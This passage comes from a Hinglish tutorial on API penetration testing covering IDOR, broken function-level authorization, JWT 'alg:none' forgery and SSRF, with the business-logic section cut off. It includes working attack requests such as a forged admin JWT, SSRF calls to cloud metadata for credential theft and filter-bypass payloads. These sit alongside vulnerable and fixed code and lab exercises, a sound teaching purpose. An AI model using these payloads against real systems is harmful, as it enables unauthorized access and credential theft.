        app.get('/api/v1/users/:id', (req, res) => {
          const targetUserId = req.params.id;
          const loggedInUserId = req.user.id; // Token se mila
          
          // 💡 Yahi hai "Authorization Check"
          if (targetUserId !== loggedInUserId) { 
            return res.status(403).json({ "error": "Unauthorized" });
          }
          
          db.users.find(targetUserId, (user) => {
            res.json(user); // Ab safe hai
          });
        });
        ```

8.  **🐞 Common beginner mistakes (Emphasis):**

      * **Sirf `123` ko `124` karke check karna.** Asli IDs `123` nahi hoti. Woh `UUID` (e.g., `a1b2c3d4-....`) ya `Hashed ID` (e.g., `aX12Bz...`) ho sakti hain.
      * **Hashed/Obfuscated ID dekh kar give up kar dena.** Agar aapka ID `aX12Bz` hai aur victim ka `bY34Cd` hai (jo aapko nahi pata), toh aap IDOR nahi dhoondh sakte. *Lekin...* bahut baar app *doosre user* ka Hashed ID *kahin aur* leak karti hai (jaise "Profile Share" link mein, ya `GET /api/chat_buddies` ki list mein). Wahan se victim ka ID uthao aur fir Repeater mein use karo.
      * Sirf `GET` request check karna. IDOR, `POST` (update), `PUT` (overwrite), aur `DELETE` (delete) requests mein bhi ho sakta hai. Hamesha check karo.
      * `401 Unauthorized` (Token galat hai) aur `403 Forbidden` (Token sahi hai, par permission nahi hai) mein confuse hona. IDOR bypass hone par `200 OK` milta hai. IDOR block hone par `403 Forbidden` milna chahiye.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Main Burp mein ID 123 ko 124 kar raha hoon, lekin main 124 waale user ko jaanta nahi. Victim ki ID kaise milegi?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester 2 account banata hai: `attacker` (ID: 9001) aur `victim` (ID: 9002).
        2.  `attacker` (9001) se login karta hai.
        3.  Apna "Order History" dekhta hai. Burp mein request aati hai:
            `GET /api/orders/`**`7788`** (Yeh Order ID hai)
            `Authorization: Bearer <attacker_token>`
        4.  `victim` (9002) se login karta hai (doosre phone/browser par).
        5.  Apna "Order History" dekhta hai. Uski Order ID hai `7799`.
        6.  Pentester waapas `attacker` ke Repeater mein jaata hai aur `GET /api/orders/7788` ko badal kar `GET /api/orders/`**`7799`** (victim ki order ID) kar deta hai.
        7.  Request send karta hai.
        8.  Agar `attacker` (9001) ko `victim` (9002) ka order (ID 7799) dikh jaata hai -\> Yeh P1 Critical IDOR hai.
      * **😈 Real Attack Scenario (Criminal Perspective):** Attacker ek e-commerce site par `user_id=1000` se `user_id=500000` tak (Burp Intruder se) brute-force script chalata hai. Har request (`GET /api/users/<id>`) se user ka naam, email, phone, address nikaal kar apne database mein save kar leta hai. 500,000 users ka data breach.
      * **💰 Real Bug Bounty Example:** **Facebook (2013).** Ek researcher ne dhoondha ki woh `DELETE /photo.php?photo_id=<victim_photo_id>` request bhej kar *kisi ki bhi* photo delete kar sakta tha. Server check nahi kar raha tha ki photo ka maalik kaun hai.

10. **✅ Quick checklist / Mitigation:**

      * Har API request (jismein ID ho) ko `Burp Repeater` mein bhejo.
      * ID ko doosre (victim) account ki ID se badlo.
      * Sirf number (`123`) nahi, UUID (`...-abc-..`), Hashed ID, ya request body (`{"id": 123}`) mein bhi check karo.
      * **Fix:** Server par *hamesha* check karo ki `token` mein jo `user_id` hai, kya woh uss data (`resource_id`) ka asli maalik hai. (`if (token.userId == resource.ownerId)`).

11. **🏋️‍♀️ Practice exercise (Lab):**

      * Ek "Vulnerable API" (jaise `vAPI`, `crAPI`) setup karo.
      * Account 1 se login karke profile dekho.
      * Account 2 banao.
      * Account 1 ke token se Account 2 ki profile (Burp Repeater mein ID badal kar) fetch karne ki koshish karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Burp Suite Repeater` (Manual), `Burp Suite Intruder` (Automatic Brute-force).
      * **OWASP:** [Broken Object Level Authorization (BOLA)](https://www.google.com/search?q=https://owasp.org/www-project-api-security/assets/2023/en/src/0x01-bola.md) (IDOR ka naya, fancy naam).

-----

## 6.2: API Hacking: BOLA / BAC (Broken Object/Function Level Authorization)

1.  **🎯 Title / Short Summary:** Normal User bane Admin (BOLA/BAC) 🦸. Jab ek normal user (Object/IDOR) ya admin-only "function" (Function/BAC) ko access kar leta hai.

2.  **🤔 Kya hai? (What?):**

      * **BOLA (Broken Object Level Authorization):** Yeh IDOR ka hi doosra naam hai. (OWASP API Top 10 ne naam badal diya). Iska matlab hai "Object" (data) level par galti. (Humne M6.1 mein cover kar liya).
      * **BAC / BFLA (Broken Access Control / Broken Function Level Authorization):** Yeh zyada dangerous hai. Iska matlab hai "Function" (action) level par galti. Jab ek normal user (Raju) ek aise API endpoint ko *direct call* kar leta hai jo sirf Admin (Boss) ke liye bana tha (jaise `POST /api/admin/delete_user?id=123`).

3.  **💡 Kyu important hai? (Why?):** IDOR/BOLA se aap *ek* user ka data churate hain. BFLA/BAC se aap (normal user) *Admin* ban jaate hain aur poora system (saare users) ko control kar sakte hain. Yeh P0/P1 Critical bug hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * **(Foundational)** Jab aap normal user ki tarah login karte hain.
      * **Jagah:** `Burp Suite` aur `JADX` (Static Analysis).
      * **Kaise:**
        1.  App ka code (JADX) ya JavaScript (web app ka) reverse karke `admin`, `manage`, `dashboard` jaise keywords dhoondho. Isse aapko "chhupe hue" admin API endpoints (e.g., `/api/admin/`) milenge.
        2.  App UI mein normal user ko 'Admin' button *nahi* dikhta.
        3.  Lekin aap (attacker) Burp Repeater mein (normal user ke token se) us chhupe hue admin endpoint (`POST /api/admin/create_user`) ko *direct call* karne ki koshish karte ho.
      * **Galti:** Server ne API endpoint (`/api/admin/`) par yeh check *nahi* lagaya ki "Kya yeh user (token se) 'admin' role rakhta hai?"

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * **Full System Takeover:** Ek normal attacker (jo Rs. 10 dekar sign up hua) Admin API call karke *saare* users ko delete kar sakta hai, khud ko admin bana sakta hai, ya poora database dump kar sakta hai.

-----

### ⭐ Comparison: BOLA (IDOR) vs. BFLA (BAC)

| Pehlu (Aspect) | 👤 BOLA (Broken Object Level Auth) / IDOR | 🦸 BFLA (Broken Function Level Auth) / BAC |
| :--- | :--- | :--- |
| **2. Kya hai?** | Ek user (User A) doosre user (User B) ka **data (Object)** access kar leta hai. | Ek user (Normal) doosre role (Admin) ka **kaam (Function)** kar leta hai. |
| **3. Kyu important?** | User data chori hota hai. | Poora system chori ho jaata hai (System Takeover). |
| **4. Kab/Kahan?** | **"Object" (ID) badal kar check karo.**<br>`GET /api/users/`**`123`** (Aapka)<br>`GET /api/users/`**`124`** (Victim ka) | **"Role" (Token) wahi rakh kar "Endpoint" badlo.**<br>`GET /api/users/123` (Aapka)<br>`POST /api/`**`admin`**`/delete_user?id=124` (Admin ka) |
| **9. Real-World Scenario** | **Aap (User A):** `mybank.com/view_statement?id=111`<br>**Aap (Attacker):** `mybank.com/view_statement?id=222` (User B ka statement) | **Aap (User):** `mybank.com/profile` (Normal)<br>**Aap (Attacker):** `mybank.com/`**`admin/add_money`** (Admin function) (Aap normal user token se admin function call kar rahe hain) |

-----

7.  **💻 Code example / Command Example (BFLA / BAC):**

      * **Exploitation (Burp Repeater Request):**

        ```http
        # 1. Aap ek 'normal_user' ki tarah login hain.
        # 2. Aapne JADX se (ya guess karke) ek 'admin' endpoint dhoondh liya.
        # 3. Aap Burp Repeater se (normal user ke token se) use call kar rahe hain:

        POST /api/v1/admin/users/create HTTP/1.1
        Host: api.vulnerable.com
        Authorization: Bearer <token_of_NORMAL_USER>

        {
          "username": "new_admin_user",
          "password": "Password123",
          "role": "admin"
        }
        ```

      * **✍️ Line-by-line explanation:**

          * `POST /api/v1/admin/users/create`: Hum ek 'admin-only' endpoint call kar rahe hain.
          * `Authorization: Bearer <token_of_NORMAL_USER>`: Humara token (pehchaan patra) 'normal user' ka hai, 'admin' ka nahi.
          * `{"role": "admin"}`: Hum naya user bhi 'admin' role ka bana rahe hain.

      * **🚀 Quick run expected output (Vulnerable):**

          * Server `201(Created)` ya `200 OK` dega.
          * `{"message": "User new_admin_user created"}`.
          * **Nateeja:** Aapne (normal user) ek naya Admin account bana liya. Game Over.

      * **Vulnerable Server Code (Node.js/Express):**

        ```javascript
        // 🐞 KHATRA: Server ne endpoint par "role check" nahi lagaya.
        // Yeh endpoint (e.g., admin.js file) seedha logic run kar raha hai.
        app.post('/api/v1/admin/users/create', (req, res) => {
          // Yeh check kiya hi nahi ki req.user.role == 'admin' hai ya nahi
          db.createUser(req.body.username, req.body.password, req.body.role);
          res.status(201).json({"message": "User created"});
        });
        ```

      * **Secure Server Code (Node.js/Express):**

        ```javascript
        // ✅ SAFE: Humne ek "Middleware" (gatekeeper) lagaya hai.

        // Middleware function (Gatekeeper)
        function isAdmin(req, res, next) {
          if (req.user.role === 'admin') {
            next(); // Role 'admin' hai, aage (asli function) jaao
          } else {
            res.status(403).json({"error": "Forbidden: Admins only"}); // Role 'admin' nahi, yahi se bhaga do
          }
        }

        // Ab endpoint "gatekeeper" ke saath register kiya hai
        app.post('/api/v1/admin/users/create', isAdmin, (req, res) => { 
          // Yeh code tabhi chalega jab 'isAdmin' 'next()' call karega
          db.createUser(req.body.username, req.body.password, req.body.role);
          res.status(201).json({"message": "User created"});
        });
        ```

8.  **🐞 Common beginner mistakes (Emphasis):**

      * Admin endpoints dhoondh hi na paana. (Aapko JADX/Ghidra/JS files mein `admin`, `mgmt`, `super`, `dashboard` jaise keywords dhoondhne padenge).
      * `404 Not Found` dekh kar give up kar dena. (Ho sakta hai endpoint `POST` ho aur aap `GET` bhej rahe hon, ya URL galat type kiya ho).
      * `401 Unauthorized` dekh kar give up kar dena. (Ho sakta hai token expire ho gaya ho. Token refresh karke dobara try karo). (Asli block `403 Forbidden` hota hai).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Admin panel ka link (URL) toh app mein (normal user ko) dikhta hi nahi, toh main use call kaise karunga?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester app (Android) ko `JADX` mein kholta hai.
        2.  `Ctrl+Shift+F` se "admin" search karta hai.
        3.  Use `AdminUtil.java` file milti hai jismein `String ADMIN_URL = "/api/v3/admin/delete_user";` likha milta hai.
        4.  Pentester (normal user se) login karta hai. Burp chalu karta hai.
        5.  `GET /api/v3/profile` (apna profile) waali request ko Repeater mein bhejta hai.
        6.  Request ko modify karta hai:
              * Method: `GET` -\> `POST` (ya `DELETE`)
              * URL: `/api/v3/profile` -\> `/api/v3/admin/delete_user`
              * Body: `{"user_id": 9002}` (victim ki ID)
        7.  Request send karta hai (apne normal user token se).
        8.  Agar server `200 OK` bhejta hai (aur victim ka account delete ho jaata hai) -\> Yeh P0/P1 Critical BFLA/BAC hai.
      * **💰 Real Bug Bounty Example:** **HackerOne Report \#821060 (Shopify).** Ek normal user (jo store staff tha) ek "admin-only" GraphQL query (`inventoryBulkAdjustQuantityAtLocation`) call kar sakta tha. Server function-level par role check karna bhool gaya tha.

10. **✅ Quick checklist / Mitigation:**

      * **Discover:** App ka code reverse karke `admin` / `manage` waale endpoints dhoondho.
      * **Test:** Normal user ke token se unn admin endpoints ko Burp Repeater se direct call karo.
      * **Check:** `GET`, `POST`, `PUT`, `DELETE`... saare HTTP methods try karo.
      * **Fix:** **Deny by Default.** Har API endpoint (khaas kar admin waale) par ek "gatekeeper" (middleware) lagao jo check kare ki user ka "role" (token se) uss action ke liye authorized hai ya nahi.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * `crAPI` (Completely Ridiculous API) lab setup karo.
      * Ek normal user se login karo.
      * (Hint: Source code padh kar) 'admin' endpoints dhoondhne ki koshish karo aur unhe Burp se call karke BFLA dhoondho.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `JADX-GUI`/`Ghidra` (Endpoints dhoondhne ke liye), `Burp Suite Repeater` (Exploit karne ke liye).
      * **OWASP:** [API01: Broken Object Level Authorization](https://www.google.com/search?q=https://owasp.org/www-project-api-security/assets/2023/en/src/0x01-bola.md) (BOLA/IDOR)
      * **OWASP:** [API05: Broken Function Level Authorization](https://www.google.com/search?q=https://owasp.org/www-project-api-security/assets/2023/en/src/0x05-bfla.md) (BFLA/BAC)

-----

## 6.3: API Hacking: Insecure JWT Handling

1.  **🎯 Title / Short Summary:** Jaali Pehchaan Patra (Insecure JWT) 🃏. App ke "Auth Token" (JWT) ko modify karke Admin ban jaana.

2.  **🤔 Kya hai? (What?):** JWT (JSON Web Token) ek popular auth token hai. Yeh 3 parts mein hota hai (`Header.Payload.Signature`). "Insecure Handling" tab hota hai jab server, token ke *Signature* (jo proof hai ki token asli hai) ko a) check hi nahi karta, ya b) attacker ko "signature algorithm" badalne deta hai.

3.  **💡 Kyu important hai? (Why?):** Agar server signature check nahi karta, toh attacker token ke *Payload* (data) ko badal sakta hai. Woh `{"user_id": 123, "role": "user"}` ko badal kar `{"user_id": 123, "role": "admin"}` kar sakta hai, aur server (dhokhe mein) use Admin maan lega.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * **(Foundational)** Jab bhi app login ke baad `Authorization: Bearer ey...` (jo `ey` se shuru ho) waala token use karti hai.
      * **Jagah:** `Burp Repeater` aur website `jwt.io`.
      * **Galti:** Server ka code `verify()` function call karne ke bajaye `decode()` function call karta hai (jo signature check nahi karta), ya `alg: "none"` ko allow karta hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * **Full Authentication Bypass:** Attacker (jiske paas valid *normal* token hai) apna token modify karke *Admin* ban sakta hai, ya *kisi bhi doosre user* (IDOR) hone ka naatak kar sakta hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **JWT 101:** Ek JWT aisa dikhta hai: `[HEADER].[PAYLOAD].[SIGNATURE]`
          * **Header (Base64):** `{"alg": "HS256", "typ": "JWT"}` (Algorithm batata hai).
          * **Payload (Base64):** `{"user_id": 123, "role": "user", "iat": 167...}` (Asli data).
          * **Signature:** Upar ke dono parts ko ek "Secret Key" (jo sirf server ko pata hai) se sign karke banaya jaata hai. Yeh proof hai ki data badla nahi gaya hai.
      * **Attack 1: `alg: "none"` Bypass (Sabse Common):**
        1.  Burp mein token capture karo: `ey...[HEADER]...ey...[PAYLOAD]...[SIGNATURE]`
        2.  Header ko (Burp Decoder / jwt.io) Base64 decode karo. `{"alg": "HS256", ...}`
        3.  Ise badlo: `{"alg": "none", ...}`. Naye header ko Base64 encode karo (e.g., `ey...[NEW_HEADER]...`).
        4.  Payload ko Base64 decode karo. `{"role": "user", ...}`
        5.  Ise badlo: `{"role": "admin", ...}`. Naye payload ko Base64 encode karo (e.g., `ey...[NEW_PAYLOAD]...`).
        6.  Signature (teesra part) ko **poora delete kar do** (aur aakhri `.` bhi).
        7.  Naya "jaali" token bana: `[NEW_HEADER].[NEW_PAYLOAD].` (aakhir mein dot zaroori hai).
        8.  Is token ko Burp Repeater mein `Authorization: Bearer ...` ki jagah daal kar request bhejo.
      * **Attack 2: Public Key (RS256) to Symmetric Key (HS256) Bypass:** (Advanced)
          * Agar `alg: "RS256"` (jo Public/Private key use karta hai) hai, toh attacker use `alg: "HS256"` (jo ek secret key use karta hai) mein badalta hai, aur *Public Key* ko hi *Secret Key* ki jagah use karke naya signature bana leta hai. (Yeh complex hai, lekin `jwt.io` aur kuch tools ise support karte hain).

7.  **💻 Code example / Command Example:**

      * **Exploitation (Burp Repeater Request):**

        ```http
        # Original Request (Token HS256 se signed tha)
        GET /api/v1/admin/dashboard HTTP/1.1
        Host: api.vulnerable.com
        Authorization: Bearer eyJhbGciOiJIZDI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

        ---

        # Patched Request (alg: "none" + role: "admin" + Signature hata diya)
        GET /api/v1/admin/dashboard HTTP/1.1
        Host: api.vulnerable.com
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9.
        ```

      * **✍️ Line-by-line explanation (Patched Request):**

          * `Authorization: Bearer ...`: Humne poora token badal diya.
          * `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`: Yeh `{"alg":"none","typ":"JWT"}` ka Base64 hai.
          * `eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiJ9`: Yeh `{"user_id":123,"role":"admin"}` ka Base64 hai.
          * `.` (aakhri dot): Humne signature part ko *khaali* chhod diya.

      * **🚀 Quick run expected output (Vulnerable):**

          * Server (jo `alg: "none"` ko accept karta hai) signature check hi nahi karega.
          * Woh payload ko decode karega, dekhega `role: "admin"` hai, aur Admin Dashboard ka data (200 OK) bhej dega. 💥

      * **Vulnerable Server Code (Node.js - `jsonwebtoken`):**

        ```javascript
        // 🐞 KHATRA: Server 'algorithms' list mein 'none' ko allow kar raha hai
        try {
          // Attacker ne header mein alg: "none" bheja
          var decoded = jwt.verify(token, secretKey, { algorithms: ['HS256', 'none'] }); 
        } catch(err) { ... }
        ```

      * **Secure Server Code (Node.js - `jsonwebtoken`):**

        ```javascript
        // ✅ SAFE: Server *sirf* HS256 ko allow kar raha hai.
        try {
          var decoded = jwt.verify(token, secretKey, { algorithms: ['HS256'] }); 
          // Agar attacker 'none' bhejega, toh 'verify' function 'JsonWebTokenError: invalid algorithm' dega
        } catch(err) { ... }
        ```

8.  **🐞 Common beginner mistakes (Emphasis):**

      * `jwt.io` mein token paste karke "Invalid Signature" dekh kar dar jaana. (Woh toh dikhega hi, kyunki aapke paas secret key nahi hai. Bug 'verify' mein nahi, 'modify' karne mein hai).
      * Base64 encode/decode galat karna. (Yaad rakho JWT ka Base64 "URL-safe" hota hai, `+` ki jagah `-` aur `/` ki jagah `_` use hota hai, aur padding (`=`) nahi hoti). Burp Decoder ya `jwt.io` ka istemaal karo.
      * `alg: "none"` try karke `401` milne par give up kar dena. (Ho sakta hai 'none' patched ho, lekin 'RS256 to HS256' waala attack kaam kar jaaye).

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Main server ki Secret Key (jisse signature banta hai) kaise guess karunga?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester: "Guess nahi karna. Signature ko *bypass* karna hai."
        2.  Pentester (normal user) login karta hai. Token (JWT) milta hai.
        3.  Token ko `jwt.io` mein paste karta hai.
        4.  Header: `{"alg": "HS256", "typ": "JWT"}`
        5.  Payload: `{"user": "pentester", "role": "user"}`
        6.  Pentester (jaisa Step 6 mein bataya) naya token banata hai:
              * Header (`alg: "none"`) -\> Base64
              * Payload (`role: "admin"`) -\> Base64
              * Signature: (khaali)
        7.  Naye token (`[header_b64].[payload_b64].`) ko Burp Repeater mein `admin/` endpoint ke saath bhejta hai.
        8.  Server `200 OK` deta hai. P1 Critical Bug.
      * **💰 Real Bug Bounty / CVE Example:** **CVE-2015-2951.** Bahut saari purani JWT libraries (`alg: "none"`) ko by default allow karti thi. Agar server ne use disable nahi kiya, toh woh vulnerable tha.

10. **✅ Quick checklist / Mitigation:**

      * JWT token ko `jwt.io` par decode karo.
      * `alg: "none"` bypass try karo (Header badlo, Payload badlo, Signature hatao).
      * (Advanced) `RS256` ko `HS256` bypass try karo.
      * (Advanced) Secret key ko `hashcat` se brute-force karne ki koshish karo (agar woh '123456' jaisi weak hai).
      * **Fix:** Server par, `verify()` function use karte waqt `algorithms` list *hamesha* specify karo (e.g., `['HS256']`) aur `none` ko *kabhi* allow mat karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * `JWT.io` website par jaao.
      * Debugger mein, Algorithm (`HS256`) ko `none` karo.
      * Payload mein `{"role": "user"}` ko `{"role": "admin"}` karo.
      * Signature box ko *poora khaali* kar do.
      * Naya (jaali) token copy karo aur dekho woh kaisa dikhta hai.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `jwt.io` (Debugger), `Burp Decoder`, `JOSE4J` (JWT library), `jwt_tool` (Python tool).

-----

## 6.4: API Hacking: SSRF (Server-Side Request Forgery)

1.  **🎯 Title / Short Summary:** Server se Hamla (SSRF) 💻➡️🏠. Attacker ka app ke server ko "majboor" karna ki woh (server) attacker ke kehne par *kisi aur* (internal) server se baat kare.

2.  **🤔 Kya hai? (What?):** SSRF ek vulnerability hai jahan attacker, server ko ek "URL" provide karta hai aur server (bina soche samjhe) us URL ko *apne network* se fetch karta hai.

3.  **💡 Kyu important hai? (Why?):** Server aksar ek "internal" (private) network par hota hai, jahan (public internet se) protected services (jaise `localhost:8080/admin`, `http://db-internal/`) chalti hain. SSRF se attacker, server ko "pul" (bridge) ki tarah istemaal karke in *internal* services par attack kar sakta hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * **(Foundational)** Jab bhi app ki API request (URL ya body mein) *koi aur URL* leti ho.
      * **Jagah:** `Burp Repeater`.
      * **Request Example:**
          * `GET /api/v1/load_profile_pic?url=`**`http://example.com/pic.jpg`**
          * `POST /api/v1/webhooks/register` (Body: `{"hook_url": "`**`http://attacker.com/`**`"}`)
          * `GET /api/v1/documents/convert?doc_url=`**`http://....`**
      * **Galti:** Server ne yeh check nahi kiya ki user-provided URL (`http://example.com/`) ek "internal" IP (jaise `http://127.0.0.1/`) toh nahi hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * **Internal Network Scanning:** Attacker `http://192.168.1.1`, `...1.2`, `...1.3` scan karke internal network ka map bana sakta hai.
      * **Internal Service Attack:** Attacker `http://localhost:8080/admin_panel` ko access kar sakta hai jo (bina password) sirf `localhost` se chalta tha.
      * **Cloud Takeover (P1 Critical):** Attacker `http://169.254.169.254/` (Amazon/Google/Azure ka "Metadata" IP) ko call karke server ke *Cloud Credentials* (AWS\_SECRET\_KEY) chura sakta hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Step 1: Vulnerable Endpoint dhoondho.**
          * App mein "Upload Profile Pic from URL" feature hai.
          * Burp mein request aati hai:
            `POST /api/profile/pic`
            `{"image_url": "https://google.com/logo.png"}`
      * **Step 2: Request ko Repeater mein bhejo.**
      * **Step 3: External SSRF Check (Normal):**
          * `image_url` ko badlo: `{"image_url": "http://<attacker_server>.com/test"}`
          * (Aap `Burp Collaborator` ka use kar sakte hain).
          * Agar aapke server par request aati hai, toh server (backend) URL fetch kar raha hai. (Yeh SSRF hai, par low impact).
      * **Step 4: Internal SSRF Check (Critical):**
          * `image_url` ko badlo: `{"image_url": "http://127.0.0.1/"}` (Server ka 'localhost').
          * Server ka response dekho.
          * **Result 1 (Secure):** `{"error": "Invalid URL"}` (Server ne block kar diya).
          * **Result 2 (Vulnerable):** `{"error": "Failed to parse image"}` ya `HTML content of Apache...` (Matlab server ne `localhost` ko fetch kiya, par use image nahi mili). 💥 Bug\!
      * **Step 5: Exploit (Cloud Metadata):**
          * `image_url` ko badlo: `{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`
          * Server ka response dekho -\> Agar AWS credentials (AccessKey, SecretKey) aa gaye -\> P1 Critical.

7.  **💻 Code example / Command Example:**

      * **Exploitation (Burp Repeater Request):**

        ```http
        # Attacker, server ko (image_url se) bol raha hai ki 
        # "apne hi (127.0.0.1) 'admin' panel ko fetch karo"

        POST /api/v1/profile/set_picture HTTP/1.1
        Host: api.vulnerable.com
        Authorization: Bearer <user_token>

        {
          "image_url": "http://127.0.0.1/admin?action=delete_all_users"
        }
        ```

      * **✍️ Line-by-line explanation:**

          * `image_url: "http://127.0.0.1/admin..."`: Server (backend) is URL ko fetch karega. Server ke liye `127.0.0.1` woh *khud* hai. Server *khud* apne `/admin` panel ko call kar dega.

      * **🚀 Quick run expected output (Vulnerable):**

          * Server `200 OK` dega, aur background mein (attacker ke kehne par) `delete_all_users` action trigger ho jaayega.

      * **Vulnerable Server Code (Python - Flask):**

        ```python
        # 🐞 KHATRA: Server 'url' parameter ko seedha 'requests.get' mein daal raha hai
        @app.route('/load_image', methods=['GET'])
        def load_image():
            image_url = request.args.get('url') # User se 'url' liya
            
            # 💡 Bina check kiye, seedha fetch kar liya
            response = requests.get(image_url) 
            
            return response.content
        ```

      * **Secure Server Code (Python - Flask):**

        ```python
        # ✅ SAFE: Hum 'safelist' (whitelist) use kar rahe hain
        from urllib.parse import urlparse

        SAFE_HOSTS = ['allowed.images.com', 'static.google.com']

        @app.route('/load_image', methods=['GET'])
        def load_image():
            image_url = request.args.get('url')
            parsed_url = urlparse(image_url)
            
            # 💡 Yahi hai "Authorization Check"
            if parsed_url.hostname not in SAFE_HOSTS:
                return "Error: Host not allowed", 403
            
            response = requests.get(image_url) 
            return response.content
        ```

8.  **🐞 Common beginner mistakes (Emphasis):**

      * Sirf `127.0.0.1` try karna. (Ise 'localhost', `0.0.0.0`, ya `[::1]` (IPv6) bhi likh sakte hain).
      * `http://127.0.0.1` ko server block (blacklist) kar de toh give up kar dena. (Bypass try karo: `http://127.0.0.1.xip.io/` (yeh DNS, 127.0.0.1 par resolve hota hai), ya URL encoding (`http://127.0.0.1` ko `%68%74...`) use karo).
      * `http://` block ho toh give up kar dena. (Try `file:///etc/passwd`, `gopher://`, `dict://`).
      * **Burp Collaborator Client** use na karna. SSRF dhoondhne ka yeh best tool hai.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Main server ke 'internal' network ko kaise dekh sakta hoon?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ko API milti hai: `GET /api/v1/get_site_favicon?url=https://google.com`
        2.  Pentester (Burp Collaborator se) ek unique URL banata hai: `xyz.burpcollaborator.net`
        3.  Repeater mein bhejta hai: `..._favicon?url=http://xyz.burpcollaborator.net`
        4.  Burp Collaborator tab mein "Ping" (request) aa jaati hai. (Confirm: SSRF hai).
        5.  Pentester (Critical P1) try karta hai:
            `..._favicon?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Role-Name`
        6.  Server ke response mein (HTML/image ki jagah) AWS Secret Key aur Token aa jaata hai.
        7.  Pentester P1 (Critical) bug file karta hai: "SSRF on /get\_site\_favicon leads to AWS Metadata (Cloud Credentials) theft."
      * **💰 Real Bug Bounty / CVE Example:** **Capital One Breach (2019).** Attacker ne ek public-facing WAF (Firewall) mein SSRF vulnerability ka istemaal karke `169.254.169.254` (AWS Metadata) se credentials churaye aur 100+ million users ka data (S3 se) nikaal liya.

10. **✅ Quick checklist / Mitigation:**

      * Har API endpoint (jo URL leta hai) ko check karo.
      * `Burp Collaborator` (external) se check karo.
      * `127.0.0.1` (internal) se check karo.
      * `169.254.169.254` (cloud) se check karo.
      * **Fix:** Blacklist (`127.0.0.1` block karna) bekaar hai. Hamesha **Whitelist (Safelist)** (jaisa secure code mein hai) use karo. Sirf `allowed.hosts.com` ko hi allow karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * `vAPI` (Vulnerable API) lab setup karo.
      * Usmein "Image Converter" ya "Profile Pic from URL" jaisa feature dhoondho.
      * `Burp Collaborator` ka URL daal kar SSRF confirm karo.
      * `http://127.0.0.1/` daal kar internal access try karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** `Burp Suite Repeater`, `Burp Collaborator Client`.
      * **Payloads:** `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery` (SSRF Payloads ka khazana).

-----

## 6.5: API Hacking: Business Logic Flaws

1.  **🎯 Title / Short Summary:** App ko 'Pagal' Banana (Logic Flaw) 🤯. Aise bugs jo 'technical' nahi, balki 'business' (soch) ki galti hain.

2.  **🤔 Kya hai? (What?):** Yeh ek aisi vulnerability hai jahan app ke code mein (SQLi, XSS, IDOR) galti nahi hai, lekin app ke *kaam karne ke tareeke* (logic) mein galti hai, jise attacker abuse kar sakta hai. (Jaise: Free mein samaan order karna, password reset flow ko bypass karna).

3.  **💡 Kyu important hai? (Why?):** Yeh bugs automated scanners (jaise MobSF) *kabhi* nahi pakad sakte. Inhe dhoondhne ke liye "Attacker Mindset" (insani dimaag) 🧠 chahiye. Yeh aksar sabse high-impact (P1/P0) bugs hote hain kyunki yeh seedha company ke 'paise' (revenue) par attack karte hain.

4.  **⏰ Kab/Kahan check karein? (When/Where?):**

      * **(Foundational)** Jab aap app ke "core features" (jahan paisa involve ho) ko test kar rahe hon.
      * **Jagah:** `Burp Repeater` aur aapka dimaag.
      * **Feature Example:**
          * Shopping Cart / Checkout (Sabse common)
          * Password Reset Flow
          * Refer-a-friend / Coupon Code Flow
          * Fund Transfer
      * **Galti:** Developer ne "negative numbers" (`-1`), "race conditions" (ek saath 2 request), ya "parameter tampering" (request badalna) ke baare mein socha hi nahi.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**

      * **Infinite Money:** Attacker free mein shopping kar sakta hai ya apne wallet mein infinite paisa daal sakta hai.
      * **Account Takeover:** Attacker (bina OTP) kisi ka bhi password reset kar sakta hai.
      * Aap sabse creative aur high-bounty bugs miss kar denge.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (Example: Shopping Cart):**

      * **Normal Flow (User):**
        1.  User, "Apple iPhone" (Rs. 1,00,000) ko cart mein add karta hai.
        2.  Burp Request: `POST /api/cart/add` (Body: `{"item_id": 123, "quantity": 1}`)
        3.  Cart Total: Rs. 1,00,000.
        4.  Checkout -\> Payment.
      * **Logic Flaw (Attacker):**
        1.  Attacker (Step 2) ki request ko Repeater mein bhejta hai.
